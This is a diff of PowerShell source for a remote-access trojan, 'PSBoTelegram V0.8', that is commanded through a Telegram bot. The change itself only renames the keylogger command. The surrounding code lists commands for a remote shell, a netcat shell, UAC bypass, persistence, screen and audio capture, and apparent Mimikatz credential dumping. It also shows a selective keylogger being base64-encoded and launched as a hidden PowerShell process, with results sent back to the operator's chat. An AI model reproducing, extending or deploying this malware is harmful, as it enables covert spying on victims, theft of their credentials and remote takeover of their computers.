@@ -249,7 +249,7 @@ Remove-Item $ruta ;return $extraido}}} extrae_credenciales' ; $keylogger = $KeyL
 
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
- $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*]/KeyLogger-Selective"
+ $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*] /KeyLogger_Selective"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
@@ -267,8 +267,8 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence") {$texto = "La funcion de persistencia se ejecuta: `n /Persistence On`n /Persistence Off"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Persistence On") {$texto = persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/KeyLogger-Selective") {$texto = "Activa un KeyLogger de manera selectiva.`nEjemplo: /KeyLogger-Selective facebook"}
- if ($comando -like "/KeyLogger-Selective*") {$comando = $comando -replace "/KeyLogger-Selective ",""; $code = (crea_keylogger -extrae $comando);$code = code_a_base64 -code $code; $code = "start-process powershell.exe -ArgumentList -WindowStyle Hidden -E $code"; IEX $code;  $texto = "Lanzado Keylogger-Selective" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
+ if ($comando -like "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`nEjemplo: /KeyLogger_Selective facebook"}
+ if ($comando -like "/KeyLogger_Selective*") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = (crea_keylogger -extrae $comando);$code = code_a_base64 -code $code; $code = "start-process powershell.exe -ArgumentList -WindowStyle Hidden -E $code"; IEX $code;  $texto = "Lanzado Keylogger-Selective" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/MimiGatoz") {mimigatoz}
 
 }
